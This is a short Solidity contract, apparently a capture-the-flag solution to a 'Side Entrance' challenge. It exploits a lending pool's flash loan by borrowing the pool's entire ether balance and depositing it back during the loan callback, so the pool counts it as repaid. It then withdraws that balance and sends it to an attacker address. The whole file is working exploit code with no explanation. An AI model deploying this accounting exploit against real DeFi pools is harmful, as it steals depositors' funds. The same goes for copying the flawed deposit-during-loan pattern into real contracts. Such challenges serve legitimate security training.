pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 amount) external;
    function deposit() external payable;
    function withdraw() external ;
}

contract SideEntraceAttack {
    using Address for address ;

    IPoolFunc public pool;
    address payable public attacker;
    uint256 public balance;

    constructor(address poolAddress,
                address payable attackerAddress
               ) 
    {
        attacker = attackerAddress;
        pool = IPoolFunc(poolAddress);
        balance = address(poolAddress).balance;
        console.log("Starting flashloan %s",balance);
        pool.flashLoan(balance);
        
        console.log("Flashloan complete");
    }

    function execute() external payable{
         pool.deposit{value:msg.value}();
    }

    function printMoney() external {
        console.log("Starting printer");
        pool.withdraw();
        console.log("BBRRRTTTT");
        attacker.send(balance);
    }

}